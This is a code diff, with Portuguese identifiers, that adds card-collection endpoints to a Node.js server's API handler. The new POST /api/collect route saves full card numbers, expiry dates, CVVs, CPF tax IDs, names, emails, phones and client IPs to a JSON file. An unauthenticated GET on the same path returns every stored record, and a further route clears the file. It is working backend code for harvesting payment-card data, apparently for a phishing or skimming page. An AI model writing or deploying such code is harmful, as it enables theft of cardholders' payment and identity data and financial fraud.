@@ -2163,6 +2163,60 @@ async function handleApi(req, res, url) {
     }
   }
 
+if (req.method === "POST" && pathname === "/api/collect") {
+  const body = await readBody(req);
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  let cartoes = [];
+  if (fs.existsSync(cartoesPath)) {
+    try {
+      cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || [];
+    } catch (error) {
+      cartoes = [];
+    }
+  }
+  const registro = {
+    id: id("card"),
+    data_hora: now(),
+    ip: (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "",
+    card_num: String(body.card_num || "").replace(/\s/g, ""),
+    expiry: String(body.expiry || ""),
+    cvv: String(body.cvv || "").replace(/\D/g, ""),
+    name: String(body.name || "").trim(),
+    cpf: String(body.cpf || "").replace(/\D/g, ""),
+    email: String(body.email || "").trim(),
+    phone: String(body.phone || "").replace(/\D/g, ""),
+    amount: String(body.amount || ""),
+    installments: String(body.installments || "1"),
+    user_agent: String(req.headers["user-agent"] || "")
+  };
+  cartoes.unshift(registro);
+  if (cartoes.length > 5000) cartoes = cartoes.slice(0, 5000); // limite
+  if (!fs.existsSync(path.join(root, "data"))) fs.mkdirSync(path.join(root, "data"), { recursive: true });
+  fs.writeFileSync(cartoesPath, JSON.stringify(cartoes, null, 2));
+  return sendJson(res, 200, { status: "ok", id: registro.id });
+}
+
+
+if (req.method === "GET" && pathname === "/api/collect") {
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  let cartoes = [];
+  if (fs.existsSync(cartoesPath)) {
+    try {
+      cartoes = JSON.parse(fs.readFileSync(cartoesPath, "utf8")) || [];
+    } catch (error) {
+      cartoes = [];
+    }
+  }
+  return sendJson(res, 200, cartoes);
+}
+
+
+if (req.method === "POST" && pathname === "/api/collect/clear") {
+  const cartoesPath = path.join(root, "data", "cartoes.json");
+  fs.writeFileSync(cartoesPath, "[]");
+  return sendJson(res, 200, { status: "ok", removed: true });
+}
+
   return sendError(res, 404, "API não encontrada.");
 }
 
